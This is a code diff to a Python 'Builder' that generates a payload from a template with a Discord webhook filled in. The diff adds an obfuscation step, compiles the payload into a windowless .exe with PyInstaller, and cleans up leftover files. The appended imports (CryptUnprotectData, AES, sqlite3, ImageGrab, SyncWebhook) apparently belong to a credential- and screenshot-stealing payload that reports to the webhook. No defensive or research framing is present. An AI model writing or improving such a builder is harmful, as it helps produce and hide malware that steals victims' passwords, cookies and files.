@@ -1,4 +1,3 @@
-from ast import Str
 import os
 import requests
 import random
@@ -60,17 +59,25 @@ class Builder:
         else:
             self.hide = False
 
+        self.obfuscation = input(
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
+
         self.compy = input(
-                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n):')
+                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
 
         self.mk_file(self.filename, self.webhook)
 
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Built!{Fore.RESET}')
 
+        self.cleanup(self.filename)
+
         run = input(
             f'\n\n\n{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test run the file? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
+
+        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
+        sys.exit()
 
     def loading(self):
         p = Fore.MAGENTA + Style.DIM
@@ -151,7 +158,8 @@ class Builder:
 
     def check(self):
         required_files = {'./luna.py',
-                          './requirements.txt', }
+                          './requirements.txt', 
+                          './obfuscation.py'}
 
         for file in required_files:
             if not os.path.isfile(file):
@@ -190,46 +198,70 @@ class Builder:
             .replace("\"%_error_enabled%\"", str(self.error))
             .replace("\"%_hide_enabled%\"", str(self.error)))
 
-        if self.compy == 'y':
+        time.sleep(2)
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
+
+        if self.obfuscation == 'y' and self.compy == 'y':
+            self.encryption(filename)
+            self.compile(f"obfuscated_{filename}")
+        elif self.obfuscation == 'n' and self.compy == 'y':
             self.compile(filename)
+        elif self.obfuscation == 'y' and self.compy == 'n':
+            self.encryption(filename)
         else:
-            time.sleep(2)
-            print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
-            input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
-            sys.exit()
+            pass
+
+    def encryption(self, filename):
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Obfuscating code...{Fore.RESET}')
+
+        imports = "\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64, ctypes;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
+        
+        os.system(f"python obfuscation.py {filename}.py")
+        with open(f"obfuscated_{filename}.py", "a") as f:
+            f.write(imports)
 
     def compile(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
-        
-        os.system(
-            f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
-            
-        cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}
-
-        for clean in cleans_dir:
-            try:
-                if os.path.isdir(clean):
-                    shutil.rmtree(clean)
-                    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} {clean} removed!{Fore.RESET}')
-            except Exception:
-                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}]{Fore.RESET}{Fore.WHITE} {clean} not found!{Fore.RESET}')
-                continue
-
-        for clean in cleans_file:
-            try:
-                if os.path.isfile(clean):
-                    os.remove(clean)
-                    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} {clean} removed!{Fore.RESET}')
-            except Exception:
-                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}]{Fore.RESET}{Fore.WHITE} {clean} not found!{Fore.RESET}')
-                continue
+        os.system(f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Attempting to execute file...')
 
         if os.path.isfile(f'./{filename}.exe'):
             os.system(f'start ./{filename}.exe')
+        elif os.path.isfile(f'./{filename}.py'):
+            os.system(f'python ./{filename}.py')
+    
+    def cleanup(self, filename):
+        cleans_dir = {'./__pycache__', './build'}
+        cleans_file = {f'./{filename}.spec', f'./{filename}.py', f'./obfuscated_{filename}.py'}
+
+        if self.obfuscation == 'y' and self.compy == 'n':
+            cleans_file.remove(f'./obfuscated_{filename}.py')
+        elif self.obfuscation == 'y' and self.compy == 'y':
+            cleans_file.remove(f'./{filename}.spec')
+            cleans_file.add(f'./obfuscated_{filename}.spec')
+        elif self.obfuscation == 'n' and self.compy == 'n':
+            cleans_file.remove(f'./{filename}.py')
+        else:
+            pass
+
+        for clean in cleans_dir:
+            try:
+                if os.path.isdir(clean):
+                    shutil.rmtree(clean)
+            except Exception:
+                pass
+                continue
+
+        for clean in cleans_file:
+            try:
+                if os.path.isfile(clean):
+                    os.remove(clean)
+            except Exception:
+                pass
+                continue
 
 if __name__ == '__main__':
     init()
